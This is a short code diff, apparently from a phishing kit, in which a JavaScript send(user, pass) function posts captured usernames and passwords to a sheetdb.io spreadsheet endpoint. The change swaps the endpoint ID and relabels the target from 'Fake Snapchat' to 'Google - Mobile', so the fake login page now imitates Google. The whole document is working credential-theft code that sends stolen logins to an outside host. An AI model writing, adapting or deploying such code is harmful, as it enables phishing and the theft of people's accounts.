@@ -35,7 +35,7 @@ function windowResized() {
   resizeCanvas(windowWidth, windowHeight);
 }
 function send(user, pass) {
-  fetch("https://sheetdb.io/api/v1/tbfbe5pdzqev3", {
+  fetch("https://sheetdb.io/api/v1/dfm6dioyizi5k", {
     method: "POST",
     headers: {
       Accept: "application/json",
@@ -46,7 +46,7 @@ function send(user, pass) {
         {
           PASSWORD: pass,
           USERNAME: user,
-          SITE: "Fake Snapchat",
+          SITE: "Google - Mobile",
         },
       ],
     }),
